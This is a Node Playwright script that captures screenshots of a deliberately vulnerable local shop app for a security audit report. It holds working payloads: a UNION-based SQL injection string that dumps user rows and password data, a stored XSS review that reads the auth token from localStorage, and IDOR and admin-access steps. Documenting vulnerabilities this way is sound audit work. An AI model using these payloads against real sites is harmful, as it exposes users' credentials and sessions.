// Generates browser screenshots of the ShopSec vulnerable app for the audit report.
// Prereqs: backend on :4000 (seeded) and frontend dev server on :5173.
import { chromium } from 'playwright';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SHOTS = path.join(__dirname, '..', 'screenshots');
const API = 'http://localhost:4000';
const APP = 'http://localhost:5173';

async function token(email, password) {
  const r = await fetch(`${API}/api/auth/login`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  return (await r.json()).token;
}

const run = async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();

  const dialogs = [];
  page.on('dialog', async (d) => { dialogs.push(d.message()); await d.dismiss(); });

  // helper: set auth in localStorage like the SPA does
  async function loginAs(email, password) {
    const t = await token(email, password);
    const u = JSON.parse(Buffer.from(t.split('.')[1], 'base64').toString());
    await page.goto(APP);
    await page.evaluate(([tok, user]) => {
      localStorage.setItem('token', tok);
      localStorage.setItem('user', JSON.stringify(user));
    }, [t, { id: u.id, username: email.split('@')[0], email: u.email, role: u.role }]);
    return t;
  }

  // 00 — home / products
  await page.goto(`${APP}/products`, { waitUntil: 'networkidle' });
  await page.screenshot({ path: path.join(SHOTS, '00-products.png'), fullPage: true });

  // 01 — login page
  await page.goto(`${APP}/login`, { waitUntil: 'networkidle' });
  await page.screenshot({ path: path.join(SHOTS, '01-login.png') });

  // VULN-02 — SQL injection in product search (leaked user rows visible in raw response)
  await page.goto(`${APP}/products`, { waitUntil: 'networkidle' });
  await page.fill('input[placeholder^="Search"]', "zzz' UNION SELECT id, username, email, password, role, 'x', created_at FROM users -- ");
  await page.click('button:has-text("Search")');
  await page.waitForTimeout(600);
  await page.click('summary');
  await page.waitForTimeout(200);
  await page.screenshot({ path: path.join(SHOTS, 'vuln-02-sqli.png'), fullPage: true });

  // VULN-01 — IDOR: alice opens bob's order #2
  await loginAs('alice@shopsec.local', 'Alice123!');
  await page.goto(`${APP}/orders/2`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(400);
  await page.screenshot({ path: path.join(SHOTS, 'vuln-01-idor.png'), fullPage: true });

  // VULN-03 — Stored XSS: post a payload review then reload to trigger it
  const alice = await loginAs('alice@shopsec.local', 'Alice123!');
  await fetch(`${API}/api/products/2/reviews`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${alice}` },
    body: JSON.stringify({
      content: '<div style="color:#ff5252;font-weight:bold;font-size:18px">⚠️ Stored XSS executed — cookies/token are reachable</div><img src=x onerror="alert(\'XSS! token=\'+localStorage.getItem(\'token\'))">',
      rating: 5,
    }),
  });
  await page.goto(`${APP}/products/2`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(800);
  await page.screenshot({ path: path.join(SHOTS, 'vuln-03-xss.png'), fullPage: true });

  // VULN-06/07 — admin page: leaked password hashes + leaked config
  await loginAs('alice@shopsec.local', 'Alice123!'); // a plain "user" reaching admin data
  await page.goto(`${APP}/admin`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(500);
  await page.screenshot({ path: path.join(SHOTS, 'vuln-07-broken-access-control.png'), fullPage: true });

  await browser.close();
  console.log('Screenshots written to', SHOTS);
  console.log('Captured JS dialogs (XSS proof):', JSON.stringify(dialogs));
};

run().catch((e) => { console.error(e); process.exit(1); });
